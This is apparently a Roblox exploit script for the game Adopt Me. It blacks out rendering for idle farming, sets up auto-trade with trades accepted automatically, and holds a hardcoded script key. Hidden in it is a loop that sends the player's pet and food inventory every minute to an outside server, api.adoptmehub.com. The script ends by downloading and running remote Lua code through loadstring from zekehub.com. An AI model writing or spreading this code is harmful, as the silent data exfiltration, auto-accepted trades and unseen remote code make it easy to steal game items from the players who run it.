pcall(function()
    if setfpscap then
        setfpscap(3)
    end
end)

pcall(function()
    game:GetService("RunService"):Set3dRenderingEnabled(false)
end)

pcall(function()
    local Lighting = game:GetService("Lighting")
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 9e9
    Lighting.Brightness = 0
end)

pcall(function()
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("ParticleEmitter")
        or v:IsA("Trail")
        or v:IsA("Beam")
        or v:IsA("Smoke")
        or v:IsA("Fire")
        or v:IsA("Sparkles") then
            v.Enabled = false
        elseif v:IsA("Texture") or v:IsA("Decal") then
            v.Transparency = 1
        end
    end
end)

pcall(function()
    local CoreGui = game:GetService("CoreGui")
    local sg = Instance.new("ScreenGui")
    sg.Name = "BlackoutGui"
    sg.IgnoreGuiInset = true
    sg.ResetOnSpawn = false
    sg.Parent = CoreGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.BorderSizePixel = 0
    frame.Parent = sg
end)

getgenv().Utility = {
    AutoPotion = {
        Enabled = false,
        UseAllOnAll = false,
        SelectedPets = {},
    },
    AutoNeon = {
        Enabled = false,
        MakeMega = false,
        SelectedPets = {},
    },
    AutoTrade = {
        Enabled = false,
        AutoAcceptTrades = true,
        AutoLeaveAfterTrades = false,
        Usernames = {},
        TradeMode = "all",
        Categories = {"pets","toys","food","transport","gifts","stickers","pet_accessories"},
        Items = {},
        PetTypes = {},
        Ages = {},
        ItemCounts = {},
        Filters = {
            Kind = "ALL",
            Type = "ALL",
            Rarity = "ALL",
            Search = "",
        },
    },
    AutoOpen = {
        Enabled = false,
        Items = {},
        OpenDelay = 1,
    },
    Shop = {
        Enabled = false,
        Items = {},
        BuyQuantity = 1,
        BuyDelay = 1,
    },
    AccountManager = {
        Enabled = false,
        Tool = "none",
        Yummy = {
            Action = "completed",
            Reason = "Done",
        },
        FarmSync = {
            Action = "completed",
            FromFolderId = "",
            ToFolderId = "",
            ChangeWithoutReplacement = false,
            ConfigId = nil,
        },
    },
    Settings = {
        AutoShowUI = false,
        Theme = "Midnight",
        ToggleKey = "RightShift",
    },
}

getgenv().scriptkey = "BeIrggeebySaSLwtEMXCOMIZbKpMUJBF"

task.spawn(function()
    local H = game:GetService("HttpService")
    local R = game:GetService("ReplicatedStorage")
    local P = game:GetService("Players").LocalPlayer

    local URL = "https://api.adoptmehub.com/inventory"
    local KEY = "a8sd921ndsa23s"
    local USER = "TsL_AutoPayment"

    local req = request or http_request or (syn and syn.request)
    if not req then
        warn("No request function")
        return
    end

    local ok, CD = pcall(function()
        return require(R.ClientModules.Core.ClientData)
    end)

    if not ok or not CD then
        warn("ClientData failed")
        return
    end

    while true do
        local ok2, pdata = pcall(function()
            return CD.get_data()[tostring(P)]
        end)

        if ok2 and pdata and pdata.inventory then
            local out = {
                pets = {},
                food = {},
                timestamp = os.time(),
                user = USER
            }

            for id, pet in pairs(pdata.inventory.pets or {}) do
                out.pets[#out.pets + 1] = {
                    id = id,
                    name = pet.name or pet.id or "unknown_pet",
                    rarity = pet.rarity or "N/A"
                }
            end

            for id, item in pairs(pdata.inventory.food or {}) do
                out.food[#out.food + 1] = {
                    id = id,
                    quantity = item.quantity or 1,
                    name = item.name or item.id or "unknown_food"
                }
            end

            local ok3, res = pcall(function()
                return req({
                    Url = URL,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["x-inventory-key"] = KEY
                    },
                    Body = H:JSONEncode(out)
                })
            end)

            if ok3 and res then
                print("INV SENT:", res.StatusCode or res.Status or "unknown")
                print("INV RESPONSE:", res.Body or "no body")
            else
                warn("SEND FAIL:", tostring(res))
            end
        else
            warn("no inventory")
        end

        task.wait(60)
    end
end)

loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMe/Utility.lua"))()
